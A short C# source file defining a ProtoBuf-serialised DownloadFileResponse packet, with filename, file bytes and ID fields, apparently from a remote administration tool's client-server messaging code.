using ProtoBuf;

namespace xServer.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class DownloadFileResponse : IPacket
    {
        [ProtoMember(1)]
        public string Filename { get; set; }

        [ProtoMember(2)]
        public byte[] FileByte { get; set; }

        [ProtoMember(3)]
        public int ID { get; set; }

        public DownloadFileResponse() { }
        public DownloadFileResponse(string filename, byte[] filebyte, int id)
        {
            this.Filename = filename;
            this.FileByte = filebyte;
            this.ID = id;
        }

        public void Execute(Client client)
        {
            client.Send<DownloadFileResponse>(this);
        }
    }
}